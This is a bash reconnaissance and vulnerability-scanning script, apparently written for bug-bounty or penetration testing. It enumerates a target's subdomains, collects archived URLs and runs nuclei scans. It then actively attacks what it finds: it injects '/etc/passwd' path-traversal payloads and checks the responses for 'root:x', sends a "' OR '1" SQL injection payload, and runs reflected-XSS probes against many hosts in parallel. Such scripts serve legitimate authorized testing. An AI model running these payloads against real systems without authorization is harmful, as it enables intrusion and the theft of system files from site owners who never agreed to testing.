recon(){

subfinder -d $1 >> domains ; assetfinder -subs-only $1 >> domains ; amass enum -norecursive -noalts -d $1 >> domains ;
sleep '10'
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u >> domains
sleep '10'
curl -s https://dns.bufferover.run/dns?q=.$1 |jq -r .FDNS_A[]|cut -d',' -f2|sort -u >> domains
sleep '10'
curl -s "https://riddler.io/search/exportcsv?q=pld:$1" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u >> domains
sleep '10'
curl -s "http://web.archive.org/cdx/search/cdx?url=*.$1/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u >> domains
sleep '10'
curl -s "https://jldc.me/anubis/subdomains/$1" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u >> domains
sleep '10'
curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> domains
sleep '10'

# ffuf -u https://FUZZ.$1 -w ~/all.txt -v -t 100 | grep "| URL |" | awk '{print $4}' >> ffuf_domain.txt

echo '


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Subdomain Scan Completed~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



'
sort domains | uniq > host
echo Total no. of domain:
cat host | wc
echo '

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Starting HTTPX~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


'
cat host | httpx -o live
sleep '10'
echo Total no. of live domain:
cat live | wc
echo '

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Starting waybackurls & Gf-Patterns~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


'
cat live | waybackurls | sort -u >> waybackdata 
cat waybackdata | gf ssrf | tee -a ssrf.txt
cat waybackdata | gf redirect | tee -a redirect.txt
cat waybackdata | gf debug_logic | tee -a debug_logic.txt
cat waybackdata | gf idor | tee -a idor.txt
cat waybackdata | gf img-traversal | tee -a img-traversal.txt
cat waybackdata | gf interestingsubs | tee -a interestingsubs.txt
cat waybackdata | gf lfi | tee -a lfi.txt
cat waybackdata | gf rce | tee -a rce.txt
cat waybackdata | gf sqli | tee -a sqli.txt
cat waybackdata | gf ssti | tee -a ssti.txt
cat waybackdata | gf xss | tee -a xss.txt

sleep '10'

echo '

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Starting NUCLEI~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


'
cat live | nuclei -t ~/nuclei-templates/technologies/ -o 1.technologies.txt
sleep '5'
cat live | nuclei -t ~/nuclei-templates/dns/ -o 2.dns.txt
sleep '5'
cat live | nuclei -t ~/nuclei-templates/subdomain-takeover/ -o 3.subdomain-takeover.txt
sleep '5'
cat live | nuclei -t ~/nuclei-templates/security-misconfiguration/ -o 4.security-misconfiguration.txt
sleep '5'
cat live | nuclei -t ~/nuclei-templates/tokens/ -o 5.tokens.txt
sleep '5'
cat live | nuclei -t ~/nuclei-templates/panels/ -o 6.panels.txt
sleep '5'
cat live | nuclei -t ~/nuclei-templates/files/ -o 7.files.txt
sleep '5'
cat live | nuclei -t ~/nuclei-templates/cves/ -o 8.cves.txt
sleep '5'
cat live | nuclei -t ~/nuclei-templates/vulnerabilities/ -o 9.vulnerabilities.txt
sleep '50'

echo '

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Find javascript files using gau and httpx~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


'
cat live | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript' > javascriptfile
sleep '10'

echo '

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~LFI Scan~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


'
cat live | gau | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' > LFI_vuln
sleep '10'
cat waybackdata | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' >> LFI_vuln
sleep '10'

echo '

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~SQL Scan~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


'
grep "=" sqli.txt | qsreplace "' OR '1" | httpx -silent -srd output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf
 "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" >> SQL_vuln
sleep '10'

echo '

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~XssReflected Scan~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


'
cat live | Gxss -p XssReflected > XssReflected
sleep '10'

echo '

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Find Interseting URL~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


'
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l live -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne


}
